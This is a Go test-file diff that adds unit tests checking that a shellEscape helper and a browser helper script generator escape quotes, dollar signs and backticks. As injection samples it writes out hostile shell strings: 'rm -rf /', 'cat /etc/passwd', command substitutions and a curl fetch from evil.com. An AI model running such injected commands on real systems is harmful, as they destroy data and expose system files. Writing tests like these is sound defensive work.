@@ -368,6 +368,82 @@ func TestScanReader_MultipleURLsPerLine(t *testing.T) {
 }
 
 // =============================================================================
+// shellEscape Tests
+// =============================================================================
+
+func TestShellEscape_NoSpecialChars(t *testing.T) {
+	tests := []struct {
+		input    string
+		expected string
+	}{
+		{"simple", "simple"},
+		{"work-profile", "work-profile"},
+		{"/usr/bin/caam", "/usr/bin/caam"},
+		{"path/with/slashes", "path/with/slashes"},
+		{"", ""},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.input, func(t *testing.T) {
+			got := shellEscape(tt.input)
+			if got != tt.expected {
+				t.Errorf("shellEscape(%q) = %q, want %q", tt.input, got, tt.expected)
+			}
+		})
+	}
+}
+
+func TestShellEscape_SpecialChars(t *testing.T) {
+	tests := []struct {
+		input    string
+		expected string
+	}{
+		// Double quote escaping
+		{`test"quote`, `test\"quote`},
+		{`"quoted"`, `\"quoted\"`},
+		// Dollar sign escaping (prevents variable expansion)
+		{"$HOME", `\$HOME`},
+		{"${USER}", `\${USER}`},
+		// Backtick escaping (prevents command substitution)
+		{"`whoami`", "\\`whoami\\`"},
+		// Backslash escaping
+		{`path\with\backslash`, `path\\with\\backslash`},
+		// Combined special characters
+		{`$("injection")`, `\$(\"injection\")`}, // Both $ and quotes get escaped
+		{`"; rm -rf /; echo "`, `\"; rm -rf /; echo \"`},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.input, func(t *testing.T) {
+			got := shellEscape(tt.input)
+			if got != tt.expected {
+				t.Errorf("shellEscape(%q) = %q, want %q", tt.input, got, tt.expected)
+			}
+		})
+	}
+}
+
+func TestShellEscape_InjectionPrevention(t *testing.T) {
+	// Test that common shell injection patterns are properly escaped
+	dangerous := []string{
+		`"; rm -rf /; echo "`,
+		`$(/bin/malicious)`,
+		"`/bin/malicious`",
+		`\"; cat /etc/passwd`,
+		`$(curl http://evil.com)`,
+	}
+
+	for _, input := range dangerous {
+		escaped := shellEscape(input)
+		// The escaped string should not contain unescaped special chars
+		// that could break out of double quotes
+		if strings.Contains(escaped, `"`) && !strings.Contains(escaped, `\"`) {
+			t.Errorf("shellEscape(%q) contains unescaped quote", input)
+		}
+	}
+}
+
+// =============================================================================
 // BrowserHelperScript Tests
 // =============================================================================
 
@@ -394,6 +470,44 @@ func TestBrowserHelperScript_SpecialChars(t *testing.T) {
 
 	if !strings.Contains(script, "/path/to/my caam") {
 		t.Error("Script should preserve binary path with spaces")
+	}
+}
+
+func TestBrowserHelperScript_InjectionPrevention(t *testing.T) {
+	// Test that shell injection attempts are properly escaped
+	tests := []struct {
+		name        string
+		binary      string
+		profile     string
+		shouldExist string // String that should exist in the escaped output
+	}{
+		{
+			name:        "profile with quotes",
+			binary:      "/usr/bin/caam",
+			profile:     `"; rm -rf /; echo "`,
+			shouldExist: `\"; rm -rf /; echo \"`, // Quotes should be escaped
+		},
+		{
+			name:        "profile with command substitution",
+			binary:      "/usr/bin/caam",
+			profile:     "$(whoami)",
+			shouldExist: `\$(whoami)`, // Dollar sign should be escaped
+		},
+		{
+			name:        "binary with backticks",
+			binary:      "/usr/bin/`malicious`",
+			profile:     "profile",
+			shouldExist: "/usr/bin/\\`malicious\\`", // Backticks should be escaped
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			script := BrowserHelperScript(tt.binary, tt.profile)
+			if !strings.Contains(script, tt.shouldExist) {
+				t.Errorf("Script should contain escaped %q, got: %s", tt.shouldExist, script)
+			}
+		})
 	}
 }
 
